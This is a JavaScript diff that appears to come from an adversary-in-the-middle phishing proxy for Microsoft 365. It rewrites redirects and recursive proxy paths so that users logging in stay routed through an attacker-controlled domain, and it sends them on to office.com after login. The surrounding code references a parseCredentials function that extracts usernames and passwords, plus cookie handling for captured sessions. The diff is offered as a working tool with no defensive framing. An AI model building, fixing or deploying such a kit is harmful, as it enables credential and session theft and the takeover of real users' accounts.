@@ -100,6 +100,13 @@ function cleanQueryString(search) {
   return result ? '?' + result : '';
 }
 
+// Helper function to check if a domain is our domain
+function isOurDomain(domain) {
+  return domain === YOUR_DOMAIN || 
+         domain.endsWith('.' + YOUR_DOMAIN) ||
+         domain.includes(YOUR_DOMAIN);
+}
+
 // ==================== CRITICAL FIX: URL PARSER ====================
 
 /**
@@ -138,11 +145,7 @@ function parseUrl(pathname, search) {
   let upstreamPath = '/';
   
   for (const segment of segments) {
-    const isSelfDomain = segment.domain === YOUR_DOMAIN || 
-                         segment.domain.endsWith(YOUR_DOMAIN) ||
-                         segment.domain.includes('ayola-ozamu.zeabur.app');
-    
-    if (!isSelfDomain) {
+    if (!isOurDomain(segment.domain)) {
       // This is a real upstream
       upstreamDomain = segment.domain;
       upstreamPath = segment.path || '/';
@@ -163,7 +166,7 @@ function parseUrl(pathname, search) {
       
       console.log(`[PARSE] Embedded: ${embeddedHost}, path: ${embeddedPath}`);
       
-      if (embeddedHost === YOUR_DOMAIN || embeddedHost.endsWith(YOUR_DOMAIN)) {
+      if (isOurDomain(embeddedHost)) {
         // Post-login redirect to self - route to office.com for landing
         upstreamDomain = 'www.office.com';
         upstreamPath = embeddedPath;
@@ -213,7 +216,7 @@ function shouldProxyDomain(hostname) {
   return false;
 }
 
-// ==================== CRITICAL FIX: LOCATION REWRITING ====================
+// ==================== FIXED: LOCATION REWRITING ====================
 
 function rewriteLocation(location, currentUpstream) {
   try {
@@ -222,18 +225,51 @@ function rewriteLocation(location, currentUpstream) {
     console.log(`[REWRITE] Location: ${location}, current: ${currentUpstream}`);
     
     // Already our domain - check if properly formatted
-    if (url.hostname === YOUR_DOMAIN || url.hostname.endsWith(`.${YOUR_DOMAIN}`)) {
-      // Check if it's a malformed recursive URL
-      // Pattern: /_p/xxx.zeabur.app/_p/real-domain/...
-      const recursivePattern = /^\/_p\/[^\/]*ayola-ozamu\.zeabur\.app\/_p\/(.+)$/;
+    if (isOurDomain(url.hostname)) {
+      
+      // CRITICAL FIX: Handle recursive self-referential URLs
+      // Pattern: /_p/www.ourdomain.com/_p/real-domain/...
+      // Escape special regex characters in domain
+      const escapedDomain = YOUR_DOMAIN.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+      const recursivePattern = new RegExp(`\\/_p\\/(?:www\\.)?[^\\/]*${escapedDomain}\\/_p\\/([^\\/]+)(\\/.*)?$`);
       const recursiveMatch = url.pathname.match(recursivePattern);
       
       if (recursiveMatch) {
-        // Extract the real path after the second _p/
-        const fixedPath = '/_p/' + recursiveMatch[1];
-        const result = `https://${YOUR_DOMAIN}${fixedPath}${url.search}`;
-        console.log(`[REWRITE] Fixed recursive: ${result}`);
+        // Extract the real domain and path after the recursive part
+        const realDomain = recursiveMatch[1];
+        const realPath = recursiveMatch[2] || '/';
+        const result = `https://${YOUR_DOMAIN}${PROXY_PREFIX}${realDomain}${realPath}${cleanQueryString(url.search)}`;
+        console.log(`[REWRITE] Fixed recursive URL: ${result}`);
         return result;
+      }
+      
+      // Check for multiple _p/ patterns
+      const parts = url.pathname.split('/');
+      const pIndices = [];
+      parts.forEach((part, index) => {
+        if (part === '_p') pIndices.push(index);
+      });
+      
+      // If we have multiple _p/ segments and one contains our domain
+      if (pIndices.length >= 2) {
+        for (let i = 0; i < pIndices.length; i++) {
+          const domainIndex = pIndices[i] + 1;
+          if (domainIndex < parts.length) {
+            const domain = parts[domainIndex];
+            if (isOurDomain(domain)) {
+              // This is our domain - skip to the next _p/
+              if (i + 1 < pIndices.length) {
+                const nextDomainIndex = pIndices[i + 1] + 1;
+                const nextPathStart = pIndices[i + 1] + 2;
+                const realDomain = parts[nextDomainIndex];
+                const realPath = '/' + parts.slice(nextPathStart).join('/');
+                const result = `https://${YOUR_DOMAIN}${PROXY_PREFIX}${realDomain}${realPath}${cleanQueryString(url.search)}`;
+                console.log(`[REWRITE] Fixed multiple _p/ pattern: ${result}`);
+                return result;
+              }
+            }
+          }
+        }
       }
       
       // Check for double-http pattern
@@ -243,10 +279,17 @@ function rewriteLocation(location, currentUpstream) {
         const msPath = doubleHttpMatch[3] || '/';
         
         if (shouldProxyDomain(msHost)) {
-          const result = `https://${YOUR_DOMAIN}${PROXY_PREFIX}${msHost}${msPath}${url.search}`;
+          const result = `https://${YOUR_DOMAIN}${PROXY_PREFIX}${msHost}${msPath}${cleanQueryString(url.search)}`;
           console.log(`[REWRITE] Double-http: ${result}`);
           return result;
         }
+      }
+      
+      // Check if it's a path that should be proxied but missing prefix
+      if (!url.pathname.startsWith(PROXY_PREFIX) && shouldProxyDomain(currentUpstream)) {
+        const result = `https://${YOUR_DOMAIN}${PROXY_PREFIX}${currentUpstream}${url.pathname}${cleanQueryString(url.search)}`;
+        console.log(`[REWRITE] Added missing proxy prefix: ${result}`);
+        return result;
       }
       
       // Already correct format
@@ -255,16 +298,16 @@ function rewriteLocation(location, currentUpstream) {
         return location;
       }
       
-      // Self-domain path without proxy prefix - add it
-      const result = `https://${YOUR_DOMAIN}${PROXY_PREFIX}www.office.com${url.pathname}${url.search}`;
-      console.log(`[REWRITE] Added proxy prefix: ${result}`);
+      // Self-domain path without proxy prefix - add it with office.com default
+      const result = `https://${YOUR_DOMAIN}${PROXY_PREFIX}www.office.com${url.pathname}${cleanQueryString(url.search)}`;
+      console.log(`[REWRITE] Added proxy prefix with default: ${result}`);
       return result;
     }
     
     // External domain - proxy it simply
     if (shouldProxyDomain(url.hostname)) {
       const result = `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${cleanQueryString(url.search)}`;
-      console.log(`[REWRITE] Proxy: ${result}`);
+      console.log(`[REWRITE] Proxy external: ${result}`);
       return result;
     }
     
@@ -272,10 +315,15 @@ function rewriteLocation(location, currentUpstream) {
     return location;
     
   } catch (e) {
-    // Relative URL
-    console.log(`[REWRITE] Relative: ${location}`);
+    // Handle relative URLs
+    console.log(`[REWRITE] Relative URL: ${location}`);
     
-    if (location.startsWith('/') && currentUpstream) {
+    if (location.startsWith('/')) {
+      // Check if it's already a proxy path
+      if (location.startsWith(PROXY_PREFIX)) {
+        return `https://${YOUR_DOMAIN}${location}`;
+      }
+      
       // Check for embedded protocol
       const embeddedMatch = location.match(/(.*)\/https?:\/?\/?([^\/]+)(.*)/);
       
@@ -287,11 +335,12 @@ function rewriteLocation(location, currentUpstream) {
           return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${embeddedHost}${embeddedPath}`;
         }
         
-        if (embeddedHost === YOUR_DOMAIN) {
+        if (isOurDomain(embeddedHost)) {
           return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${currentUpstream}${embeddedPath}`;
         }
       }
       
+      // Default: proxy through current upstream
       return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${currentUpstream}${location}`;
     }
     
@@ -347,7 +396,7 @@ function parseCredentials(bodyText) {
   return { user, pass };
 }
 
-// ==================== COOKIE HANDLING (SIMPLIFIED LIKE WORKING SCRIPT) ====================
+// ==================== COOKIE HANDLING ====================
 
 function processCookies(cookies, upstreamDomain) {
   const modifiedCookies = [];
